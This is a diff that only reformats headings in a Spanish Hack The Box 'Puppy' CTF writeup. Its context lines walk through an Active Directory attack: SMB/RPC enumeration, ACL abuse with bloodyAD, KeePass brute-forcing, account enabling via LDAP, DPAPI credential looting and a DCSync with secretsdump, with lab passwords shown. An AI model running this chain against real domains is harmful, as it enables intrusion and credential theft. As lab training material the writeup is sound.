@@ -1,4 +1,4 @@
-#1- HTB-Puppy — Writeup (traducción y explicación rápida)
+# 1- HTB-Puppy — Writeup (traducción y explicación rápida)
 
 Fecha: 2025-05-28
 Autor: HYH — entusiasta de ciberseguridad, pentesting y CTF.
@@ -11,7 +11,7 @@ Credenciales iniciales (proporcionadas): levi.james / KingofAkron2025!
 
 Explicación: te dan un usuario y contraseña para empezar el pentest, como suele pasar en máquinas de práctica.
 
-#2-Nmap
+# 2-Nmap
 
 Comando:nmap puppy.htb -sV
 Explicación: escanea puertos y detecta versiones de servicios en el host puppy.htb.
@@ -21,7 +21,7 @@ Salida (resumen):
 Varios puertos abiertos: 53 (DNS), 88 (Kerberos), 111/135 (RPC), 139/445 (SMB), 389/3268 (LDAP/AD), 5985 (HTTP WinRM), etc.
 Explicación: muestra que la máquina tiene servicios de Active Directory y SMB activos. Eso guía la estrategia de ataque (foco en AD/SMB/RPC).
 
-#3 -RPC (uso de rpcclient)
+# 3 -RPC (uso de rpcclient)
 
 Comando usado:rpcclient 10.xx.xx.xx -U levi.james
 Explicación: conecta al servicio RPC del target usando el usuario levi.james.
@@ -29,7 +29,7 @@ Dentro de rpcclient:Explicación: lista usuarios del dominio (consulta a AD vía
 
 Resultado: lista de usuarios (Administrator, Guest, krbtgt, levi.james, ant.edwards, ...).
 Explicación: obtienes usuarios válidos del dominio para posteriores ataques (password spraying, enumeración, etc.).
-#4 - SMBMAP
+# 4 - SMBMAP
 smbmap -H 10.xx.xx.xx -u levi.james -p 'KingofAkron2025!'
 Explicación: enumera recursos compartidos SMB con las credenciales dadas; intenta mostrar permisos y comentarios de cada share.
 
@@ -49,7 +49,7 @@ Explicación: detectas un share de desarrollo (DEV) que puede tener archivos út
         SYSVOL                                                  READ ONLY       Logon server share 
 [*] Closed 1 connections                   
 
-#5 BloodHound
+# 5 BloodHound
 Bloodhound (colección de datos AD)
 
 Preparación:
@@ -71,7 +71,7 @@ bloodyAD --host '10.xx.xx.xx' -d 'dc.puppy.htb' -u 'levi.james' -p 'KingofAkron2
 Explicación: usa credenciales para añadir levi.james al grupo DEVELOPERS mediante una operación que Bloodhound indicó como posible (escribir ACL). Resultado: levi.james agregado al grupo.
 Efecto: ahora tienes permisos de grupo que antes no tenías; eso abre acceso al share DEV.
 
-#6- Acceso al smb Client
+# 6- Acceso al smb Client
 smbclient //10.10.11.70/DEV -U levi.james
 Explicación: conecta interactiva al share DEV con las credenciales.
 Explicación: lista archivos en el share. Resultado muestra KeePassXC-2.7.9-Win64.msi, Projects/, recovery.kdbx, etc.
@@ -101,7 +101,7 @@ smb: \>
 
 --Password hallada por usuario HYH: Liverpool
 
-#8 -Keepass Brute (brute-force de la base KeePass KDBX4)
+# 8 -Keepass Brute (brute-force de la base KeePass KDBX4)
 
 Comando (ejecución de la herramienta personalizada):
 ./keepass4brute.sh ../recovery.kdbx /usr/share/wordlists/rockyou.txt
@@ -155,7 +155,7 @@ ant.edwards / Antman2025!
 Explicación: con eso tienes un usuario distinto (ant.edwards) cuya contraseña provino del KDBX; puede tener permisos diferentes y permitir nuevos movimientos dentro de la red.
 
 
-#10 - BloodHound Again
+# 10 - BloodHound Again
 [root@kali] /home/kali/Puppy  
 ❯ bloodhound-python -u 'ant.edwards' -p 'Antman2025!'  -d puppy.htb -ns 10.10.11.70 -c All --zip 
 INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
@@ -187,7 +187,7 @@ root@kali] /home/kali/Puppy
 
 Aunque los cambios aquí son exitosos, todavía no puedo iniciar sesión. Descubrí que el motivo es que la cuenta no está habilitada
 
-#11- Habilitar Cuenta
+# 11- Habilitar Cuenta
 Compruébelo con ldapsearch
 [root@kali] /home/kali/Puppy  
 ❯ ldapsearch -x -H ldap://10.10.11.70 -D "ANT.EDWARDS@PUPPY.HTB" -W -b "DC=puppy,DC=htb" "(sAMAccountName=ADAM.SILVER)"                       ⏎
@@ -276,7 +276,7 @@ changetype: modify
 replace: userAccountControl
 userAccountControl: 66048
 EOF
-#12- User.txt 1st flag
+# 12- User.txt 1st flag
 We use evil-winrm -i 10.10.11.70 -u 'ADAM.SILVER' -p 'Abc123456'
 Sin resultados importantes
 #13- Privilege Escalation
@@ -321,7 +321,7 @@ INFO: Done in 00M 35S
 INFO: Compressing output into 20250528144135_bloodhound.zip
 
 
-#14 - Windows Credential Manager
+# 14 - Windows Credential Manager
 Intenta encontrarlo aquí en el paso 1. Primero, obtén las credenciales guardadas en el Administrador de Credenciales de Windows. Este utiliza cifrado DPAPI (CryptProtectData) y vincula la clave maestra del usuario o equipo.
 *Evil-WinRM* PS C:\Users\steph.cooper\AppData\Roaming\Microsoft\Credentials> dir -h
 
@@ -408,7 +408,7 @@ WARNING: DCE/RPC connection failed: The NETBIOS connection with the remote host 
 INFO: Done in 01M 20S
 INFO: Compressing output into 20250528153956_bloodhound.zip
 
-#15- DCSync
+# 15- DCSync
 Ahora puedes usar DCSync directamente
 [root@kali] /home/kali/Puppy  
 ❯ impacket-secretsdump 'puppy.htb/steph.cooper_adm:FivethChipOnItsWay2025!'@10.10.11.70
